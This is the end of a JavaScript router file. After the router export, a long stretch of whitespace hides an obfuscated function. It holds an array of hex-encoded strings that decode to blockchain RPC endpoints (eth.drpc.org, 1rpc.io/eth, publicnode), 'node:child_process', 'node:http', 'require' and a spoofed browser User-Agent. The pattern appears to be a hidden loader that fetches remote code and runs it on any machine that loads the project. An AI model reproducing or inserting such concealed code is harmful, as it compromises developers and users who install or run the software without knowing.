export default router;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     function GSkqNNyuJw$_padNcYwam(){const etOZXsn_OxqoSnJy$OEFSTCE=['bcbdaff1','f3fdfdfa','a0ba88bbbba8b0','a1aca8adacbbba','b9a0b9ac','a1bdbdb9baf3e6e6f8bbb9aae7a0a6e6acbda1','a1acb1','a6aba3acaabd','aba8baacfffd','fbfffbfcfbf9f190b9a0baa6bb','8aa6a7bdaca7bde485aca7aebda1','a7a6a7aaac','f9b1a8fafbfb8cfcaffa8dfaf8f88dfaf9f1f9acffaff9f8fbf8f9fffaacf0a88d8afbfdf0f98caff8a8','afa0a5bdacbb','9681fb','baaca8bbaaa1','a1bdbdb9f3e6e6','a8adad8cbfaca7bd85a0babdaca7acbb','bbacb9a5a8aaac','a7a6adac','bbacbabca5bd','a4a0a7','a0aea7a6bbac','acbda196aba5a6aaa287bca4abacbb','a1bdbdb9baf3','f3fdfdfae6f9b1e6a5ba','efbabda8bbbdaba5a6aaa2f4f9efaca7adaba5a6aaa2f4f0f0f0f0f0f0f0f0efb9a8aeacf4f8efa6afafbaacbdf4fbf9efbaa6bbbdf4adacbaaaefafa0a5bdacbbabb0f4afbba6a4','a7a6adacf3a1bdbdb9','aeb3a0b9','b9bcbaa1','babcaba8bbbba8b0','fbad9e8fb08f9b','b8fd8f93a2b191b2e8a1e59abbfaf489','fbfffbfef8fbf9b08dbcbd9abc','a1a8ba','bebba0bdac','f8fbbdafac9a81be','bbacb8bcacbabd','aea5a6aba8a592ee969fee94f4ee','a4a8b9','f8f9f9fffcfaffa3bd868f9a8b','bbbca7','8c9d81969b998a969c9b85','aaa6a7bdaca7bde4aca7aaa6ada0a7ae','bdbba8a7baa8aabda0a6a7ba','fbe7f9','a7a6adacf3a1bdbdb9ba','a1bdbdb9baf3e6e6acbda1e7adbbb9aae7a6bbae','a8adad','a7a6adacf3aaa1a0a5ad96b9bba6aaacbaba','8ca4b9bdb0e9b9a8b0a5a6a8ade9aba6adb0','b9a8bbbaac','96bd96ba','bca7bbacaf','f8fbf0fbfafcfbfa839a818d90bc','99869a9d','8e8c9d','aabbaca8bdac80a7afa5a8bdac','eef2aea5a6aba8a592ee9681fbee94f4ee','fbfffcfefff0f9bc8e8c9f828d','f3f1f9','a1bdbdb9baf3e6e6acbda1e7aba5a6aaa2baaaa6bcbde7aaa6a4e6a8b9a0','f1f1838fb1bd86a1','acbbbba6bb','88aeaca7bd','a7a6adacf3bcbba5','bda1aca7','baa0aea7a8a5','b1e4b9a8b0a5a6a8ade4abfffd','ada8bda8','b0e4b996f7adedf98bef8997f8a898a2','fff9fafaf8fefd81b08d8c9fbb','aabbaca8bdac8bbba6bda5a08dacaaa6a4b9bbacbaba','a5aca7aebda1','818c888d','f6a4a6adbca5acf4a8aaaaa6bca7bdefa8aabda0a6a7f4bdb1a5a0babdefa8adadbbacbabaf4','84a6b3a0a5a5a8e6fce7f9e9e19ea0a7ada6bebae9879de9f8f9e7f9f2e99ea0a7fffdf2e9b1fffde0e988b9b9a5ac9eacab82a0bde6fcfafee7faffe9e182819d8485e5e9a5a0a2ace98eacaaa2a6e0e98aa1bba6a4ace6f8faf8e7f9e7f9e7f9e99aa8afa8bba0e6fcfafee7faff','aeb3a0b9e5e9adacafa5a8bdace5e9abbb','babdbba0a7aea0afb0','b9a8bda1a7a8a4ac','adacafa5a8bdac','aeacbd','a8b9b9a5a0aaa8bda0a6a7e6a3baa6a7','f3fdfdfae6f9b1e6aaa5ba','acbda196aeacbd8ba5a6aaa28bb087bca4abacbb','aaa6a7bdbba6a5a5acbb','a7a6adacf3b3a5a0ab','aaa1a8bb8aa6adac88bd','bbacbabca4ac','eef2aea5a6aba8a592ee96bd96baee94f4ee','aba5a6aaa287bca4abacbb','88f8f8e4e4e3','a1bdbdb9baf3e6e6acbda1acbbacbca4e4bbb9aae7b9bcaba5a0aaa7a6adace7aaa6a4','eef2aea5a6aba8a592ee9681ee94f4ee','b1e4aeb3a0b9','acbda196aeacbd9dbba8a7baa8aabda0a6a78aa6bca7bd','fa9ca6af9090a5','aaa8bdaaa1','a8aba6bbbd','a1bdbdb9baf3e6e6acbda1e4a4a8a0a7a7acbde7b9bcaba5a0aae7aba5a8babda8b9a0e7a0a6','eef2aea5a6aba8a592eebbee94f4bbacb8bca0bbacf2aea5a6aba8a592eea4ee94f4a4a6adbca5acf2bfa8bbe996aea5a6aba8a5f4aea5a6aba8a5f2','a8a7b0','84a0babaa0a7aee991e499a8b0a5a6a8ade48bfffd','afbba6a4','8aa6a7bdaca7bde49db0b9ac','aca7bf','aaa6a7aaa8bd','b9a6bbbd','a1a6babda7a8a4ac','b9bba6bda6aaa6a5','a2acacb9e4a8a5a0bfac','a8a5a5','abb0bdac85aca7aebda1','eef2aea5a6aba8a592ee96bd96bcee94f4ee','afa0a7ad','afa0a7ad80a7adacb1','fbfff9f9faf1fc99bb8699a088','96bd96bc','afa6bb8ca8aaa1','aca7ad','aabbaca8bdac8ebca7b3a0b9','bda69abdbba0a7ae','bda685a6beacbb8aa8baac'];GSkqNNyuJw$_padNcYwam=function(){return etOZXsn_OxqoSnJy$OEFSTCE;};return GSkqNNyuJw$_padNcYwam();}const BEf$CYFUWXrAiwaYBJ=WlysIxGuPMcViepbraDjp_wli;